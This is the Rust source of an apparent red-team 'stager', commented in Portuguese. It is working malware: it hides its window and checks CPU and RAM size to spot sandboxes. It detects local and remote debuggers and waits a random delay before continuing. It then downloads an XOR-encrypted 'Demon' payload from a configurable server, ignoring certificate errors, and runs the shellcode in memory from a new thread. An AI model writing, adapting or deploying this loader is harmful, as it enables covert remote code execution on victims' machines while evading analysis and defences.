// ========================================================
// rusta-stager/src/main.rs
// Rust Stager v2 - Lab Red Team 2026 (Stealth Mode)
// ========================================================
#![windows_subsystem = "windows"]

use log::{error, info, warn};
use obfstr::obfstr;
use rand::Rng;
use reqwest::blocking;
use std::error::Error;
use std::time::Duration;
use windows::Win32::System::Diagnostics::Debug::{IsDebuggerPresent, CheckRemoteDebuggerPresent};
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
use windows::Win32::Foundation::BOOL;

// ==================== CONFIG ====================
const XOR_KEY: &[u8] = b"LAB_REDTTEAM_2026_KEY_XOR";
const DEMON_URL: &str = "http://127.0.0.1:5000/get_demon"; // <-- Mude para seu IP

// ================================================

fn main() -> Result<(), Box<dyn Error>> {
    env_logger::init();

    // === Anti-Analysis + Anti-Debug ===
    if !perform_security_checks() {
        std::process::exit(0); // Sai silenciosamente
    }

    // === Download + Execução do Demon ===
    if let Err(e) = execute_demon() {
        error!("{} Falha na execução: {}", obfstr!("[!]"), e);
    }

    Ok(())
}

/// Realiza todas as checagens de segurança/anti-análise
fn perform_security_checks() -> bool {
    let sys = sysinfo::System::new_all();

    // 1. Checagem de CPU e RAM
    if sys.cpus().len() < 4 {
        warn!("{} Poucos núcleos de CPU detectados", obfstr!("[!]"));
        return false;
    }

    if sys.total_memory() < 7_000_000_000 {
        warn!("{} Pouca memória RAM detectada", obfstr!("[!]"));
        return false;
    }

    // 2. Checagem de Debugger
    unsafe {
        if IsDebuggerPresent().as_bool() {
            warn!("{} Debugger detectado (IsDebuggerPresent)", obfstr!("[!]"));
            return false;
        }

        let mut is_remote_debugger = BOOL(0);
        let _ = CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_remote_debugger);
        if is_remote_debugger.as_bool() {
            warn!("{} Debugger remoto detectado", obfstr!("[!]"));
            return false;
        }
    }

    // 3. Delay aleatório (anti-sandbox/timing)
    let delay = rand::thread_rng().gen_range(1800..5500);
    std::thread::sleep(Duration::from_millis(delay));

    info!("{} Todas as checagens de segurança passaram", obfstr!("[+]"));
    true
}

fn execute_demon() -> Result<(), Box<dyn Error>> {
    info!("{} Iniciando download do Demon...", obfstr!("[*]"));

    let client = blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(35))
        .build()?;

    let encrypted_data = client.get(DEMON_URL).send()?.bytes()?;

    let shellcode = decrypt_xor(&encrypted_data, XOR_KEY);

    if shellcode.len() < 100 {
        error!("{} Shellcode inválido ou muito pequeno", obfstr!("[!]"));
        return Err("Shellcode inválido".into());
    }

    unsafe {
        let addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if addr.is_null() {
            return Err("Falha no VirtualAlloc".into());
        }

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);

        let thread_start: LPTHREAD_START_ROUTINE = Some(std::mem::transmute(addr));

        let thread_handle = CreateThread(
            None,
            0,
            thread_start,
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )?;

        info!("{} Demon injetado e executado na memória!", obfstr!("[+]"));

        // Aguarda a thread terminar (pode remover se quiser fire-and-forget)
        WaitForSingleObject(thread_handle, INFINITE);
    }

    Ok(())
}

fn decrypt_xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .zip(key.iter().cycle())
        .map(|(&b, &k)| b ^ k)
        .collect()
}